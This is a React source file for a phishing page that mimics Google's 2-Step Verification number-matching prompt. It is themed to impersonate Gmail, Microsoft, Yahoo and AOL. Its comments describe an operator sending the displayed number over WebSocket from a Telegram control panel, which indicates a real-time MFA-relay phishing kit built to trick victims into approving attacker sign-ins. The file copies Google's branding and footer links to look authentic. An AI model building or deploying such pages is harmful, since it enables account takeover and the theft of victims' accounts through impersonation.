import React from 'react';
import { useLocation } from 'react-router-dom';
import { ProviderKey, getProviderTheme, ProviderLogo } from './providerTheme';

interface GoogleNumberPromptPageProps {
  providerKey: ProviderKey;
  /** Number forwarded by the operator over WebSocket. May also live on
   * `location.state.data.number` when the page is reached via navigation. */
  number?: number | string;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Google-style "Try signing in again" / 2-Step Verification "tap the matching
 * number" screen. The number itself is operator-driven (`show_google_number_prompt`
 * WebSocket command) — the page just displays it prominently, mirroring how
 * the real Google sign-in page asks the user to tap the matching number on
 * their phone.
 *
 * Although it is keyed off the Gmail flow, every provider routes here when the
 * operator clicks "Google # Prompt" in the Telegram control panel; we still
 * theme by provider so the chrome (background, fonts, accent) matches the
 * surrounding pages for that provider.
 */
const GoogleNumberPromptPage: React.FC<GoogleNumberPromptPageProps> = ({ providerKey, number: numberProp, onAction }) => {
  const location = useLocation();
  const theme = getProviderTheme(providerKey);
  const stateData = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (stateData.email as string) || '';
  const numberFromState = stateData.number as number | string | undefined;
  const number = (numberProp ?? numberFromState ?? '').toString();
  const deviceName = (stateData.deviceName as string) || (stateData.device as string) || 'your phone';

  const handleTryAnother = () => onAction('cancel');
  const handleNotMe = () => onAction('deny_authenticator');

  // Per-provider companion app name shown in the "Open your <app>" copy.
  // Defaults to the provider's display name (e.g. "Google", "Microsoft") when
  // no specific authenticator-app brand applies.
  const appName: Record<ProviderKey, string> = {
    gmail: 'Gmail',
    office365: 'Microsoft Authenticator',
    yahoo: 'Yahoo Mail',
    aol: 'AOL',
    others: 'authenticator',
  };

  // Gmail / Google has its own dedicated chrome (the real Google # prompt
  // screen). Other providers reuse the same big-number layout but in their
  // own theme so the experience is consistent if the operator ever fires
  // this command for a non-Gmail session.
  // Real Google "Trying to sign in?" / 2-Step Verification number-prompt
  // page is a wide two-column card on desktop: left column has the Google
  // logo, "2-Step Verification" header, intro copy and the account chip;
  // right column shows a phone illustration with the prompted number
  // displayed inside it, plus a "Don't see your phone?" / "Try another
  // way" link. On mobile the columns stack. We mirror that layout here
  // exactly for Gmail (the canonical case); non-Gmail providers reuse the
  // same layout in their own theme so the chrome stays consistent if the
  // operator ever fires this command for a non-Gmail session.
  return (
    <div className={`min-h-screen flex flex-col font-sans ${theme.backgroundClass}`} style={{ fontFamily: theme.fontFamily }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div
          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-8 md:px-14 py-10 md:py-12"
          style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
        >
          <div className="flex flex-col md:flex-row md:gap-16">
            {/* Left column — Google logo, headline, intro, account chip */}
            <div className="md:w-1/2 md:pt-4">
              <ProviderLogo providerKey={providerKey} className="h-10 w-10" />
              <h1 className="text-[28px] md:text-[36px] leading-tight font-normal text-gray-900 mt-8">
                2-Step Verification
              </h1>
              <p className="text-[15px] leading-6 text-gray-700 mt-4 max-w-md">
                A sign-in attempt requires further verification. To finish signing in, follow the instructions on your {deviceName}.
              </p>
              {email && (
                <div className="mt-6">
                  <button
                    type="button"
                    className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors"
                    aria-label={email}
                  >
                    <div
                      className="w-7 h-7 rounded-full flex items-center justify-center text-white text-xs font-semibold"
                      style={{ backgroundColor: theme.primary }}
                    >
                      {email.charAt(0).toUpperCase()}
                    </div>
                    <span className="text-sm text-gray-800 pr-1">{email}</span>
                    <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true">
                      <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                    </svg>
                  </button>
                </div>
              )}
            </div>

            {/* Right column — phone illustration with the prompted number,
                instructions, and the "Try another way" / "It wasn't me"
                actions. The phone outline is drawn with SVG so it renders
                identically to Google's phone mockup. */}
            <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col items-center">
              <p className="text-[15px] leading-6 text-gray-800 self-start">
                Open your <strong>{appName[providerKey]}</strong> app on {deviceName}. Tap{' '}
                <strong>Yes</strong> on the prompt, then tap the number below.
              </p>

              <div className="relative mt-6 flex justify-center" aria-hidden="true">
                <svg width="180" height="270" viewBox="0 0 180 270" xmlns="http://www.w3.org/2000/svg">
                  {/* Phone body */}
                  <rect x="10" y="6" width="160" height="258" rx="22" ry="22"
                        fill="#fff" stroke="#dadce0" strokeWidth="2" />
                  {/* Speaker */}
                  <rect x="74" y="20" width="32" height="4" rx="2" fill="#dadce0" />
                  {/* Screen */}
                  <rect x="22" y="36" width="136" height="200" rx="6" fill="#f8f9fa" />
                  {/* Notification card */}
                  <rect x="32" y="56" width="116" height="62" rx="8" fill="#fff" stroke="#dadce0" />
                  <circle cx="46" cy="72" r="6" fill={theme.primary} />
                  <rect x="58" y="68" width="50" height="4" rx="2" fill="#5f6368" />
                  <rect x="58" y="78" width="74" height="3" rx="1.5" fill="#9aa0a6" />
                  <rect x="40" y="94" width="80" height="4" rx="2" fill="#3c4043" />
                  <rect x="40" y="104" width="60" height="3" rx="1.5" fill="#9aa0a6" />
                  {/* Big number badge inside the phone screen */}
                  <rect x="46" y="140" width="88" height="58" rx="14" fill={theme.primaryLight} />
                </svg>
                <div
                  className="absolute select-none"
                  style={{
                    top: '160px',
                    left: '50%',
                    transform: 'translateX(-50%)',
                    color: theme.primary,
                    fontSize: '34px',
                    lineHeight: '1',
                    fontWeight: 500,
                    letterSpacing: '0.04em',
                  }}
                  aria-label={`Verification number ${number}`}
                >
                  {number || '--'}
                </div>
              </div>

              <div className="flex items-center justify-center mt-6">
                <svg
                  className="animate-spin h-5 w-5 mr-2"
                  style={{ color: theme.primary }}
                  viewBox="0 0 24 24"
                  fill="none"
                  aria-hidden="true"
                >
                  <circle cx="12" cy="12" r="10" stroke="currentColor" strokeOpacity=".25" strokeWidth="4" />
                  <path d="M4 12a8 8 0 018-8" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
                </svg>
                <span className="text-sm text-gray-700">Waiting for you to tap on your phone&hellip;</span>
              </div>

              <div className="flex justify-between items-center w-full mt-10">
                <button
                  type="button"
                  onClick={handleNotMe}
                  className="text-sm font-semibold hover:underline"
                  style={{ color: theme.primary }}
                >
                  No, it&rsquo;s not me
                </button>
                <button
                  type="button"
                  onClick={handleTryAnother}
                  className="text-sm font-semibold hover:underline"
                  style={{ color: theme.primary }}
                >
                  Try another way
                </button>
              </div>
            </div>
          </div>
        </div>
      </main>

      {providerKey === 'gmail' && (
        <footer className="w-full max-w-[960px] mx-auto flex justify-end items-center px-4 py-6 text-xs text-gray-700">
          <div className="flex items-center space-x-4">
            <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
            <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          </div>
        </footer>
      )}
    </div>
  );
};

export default GoogleNumberPromptPage;
